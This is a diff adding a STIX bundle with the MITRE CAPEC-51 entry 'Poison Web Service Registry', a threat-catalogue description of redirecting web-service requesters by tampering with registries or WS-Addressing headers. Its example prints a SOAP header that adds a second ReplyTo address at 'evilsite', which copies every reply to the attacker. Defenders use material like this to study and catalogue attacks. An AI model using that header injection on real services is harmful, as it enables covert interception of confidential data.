@@ -1,0 +1,71 @@
+{
+    "type": "bundle",
+    "id": "bundle--199481b9-a172-4aa6-8998-1eb32621ae90",
+    "spec_version": "2.0",
+    "objects": [
+        {
+            "type": "attack-pattern",
+            "id": "attack-pattern--943fa8f4-b777-4f3c-984b-9f620e50c70b",
+            "created_by_ref": "identity--e50ab59c-5c4f-4d40-bf6a-d58418d89bcd",
+            "created": "2014-06-23T00:00:00.000Z",
+            "modified": "2014-06-23T00:00:00.000Z",
+            "name": "Poison Web Service Registry",
+            "description": "SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata (to effect a denial of service), and delete information about service provider interfaces. WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. The attacker that can rewrite WS-addressing information gains the ability to route service requesters to any service providers, and the ability to route service provider response to any service. Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol. The basic flow for the attacker consists of either altering the data at rest in the registry or uploading malicious content by spoofing a service provider. The service requester is then redirected to send its requests and/or responses to services the attacker controls.",
+            "external_references": [
+                {
+                    "source_name": "capec",
+                    "url": "https://capec.mitre.org/data/definitions/51.html",
+                    "external_id": "CAPEC-51"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/285.html",
+                    "external_id": "CWE-285"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/74.html",
+                    "external_id": "CWE-74"
+                },
+                {
+                    "source_name": "cwe",
+                    "url": "http://cwe.mitre.org/data/definitions/693.html",
+                    "external_id": "CWE-693"
+                }
+            ],
+            "object_marking_refs": [
+                "marking-definition--17d82bb2-eeeb-4898-bda5-3ddbcd2b799d"
+            ],
+            "x_capec_abstraction": "Detailed",
+            "x_capec_consequences": {
+                "Availability": [
+                    "Execute Unauthorized Commands (Run Arbitrary Code)"
+                ],
+                "Confidentiality": [
+                    "Execute Unauthorized Commands (Run Arbitrary Code)",
+                    "Read Data"
+                ],
+                "Integrity": [
+                    "Execute Unauthorized Commands (Run Arbitrary Code)",
+                    "Modify Data"
+                ]
+            },
+            "x_capec_example_instances": [
+                "\n               <xhtml:p>WS-Addressing provides location and metadata about the service endpoints. An extremely hard to detect attack is an attacker who updates the WS-Addressing header, leaves the standard service request and service provider addressing and header information intact, but adds an additional WS-Addressing Replyto header. In this case the attacker is able to send a copy (like a cc in mail) of every result the service provider generates. So every query to the bank account service, would generate a reply message of the transaction status to both the authorized service requester and an attacker service. This would be extremely hard to detect at runtime.</xhtml:p>\n               <xhtml:div style=\"margin-left:10px;\" class=\"informative\"><S:Header><xhtml:div style=\"margin-left:10px;\"><wsa:MessageID><xhtml:div style=\"margin-left:10px;\">http://example.com/Message</xhtml:div>\n                     </wsa:MessageID><wsa:ReplyTo><xhtml:div style=\"margin-left:10px;\"><wsa:Address>http://valid.example/validClient</wsa:Address></xhtml:div>\n                     </wsa:ReplyTo><wsa:ReplyTo><xhtml:div style=\"margin-left:10px;\"><wsa:Address>http://evilsite/evilClient</wsa:Address></xhtml:div>\n                     </wsa:ReplyTo><wsa:FaultTo><xhtml:div style=\"margin-left:10px;\"><wsa:Address>http://validfaults.example/ErrorHandler</wsa:Address></xhtml:div>\n                     </wsa:FaultTo></xhtml:div>\n                  </S:Header></xhtml:div>\n               <xhtml:p>In this example \"evilsite\" is an additional reply to address with full access to all the messages that the authorized (validClient) has access to. Since this is registered with ReplyTo header it will not generate a Soap fault.</xhtml:p>\n            "
+            ],
+            "x_capec_likelihood_of_attack": "High",
+            "x_capec_prerequisites": [
+                "The attacker must be able to write to resources or redirect access to the service registry."
+            ],
+            "x_capec_resources_required": [
+                "Capability to directly or indirectly modify registry resources"
+            ],
+            "x_capec_skills_required": {
+                "Low": "To identify and execute against an over-privileged system interface"
+            },
+            "x_capec_status": "Draft",
+            "x_capec_typical_severity": "Very High",
+            "x_capec_version": "3.2"
+        }
+    ]
+}
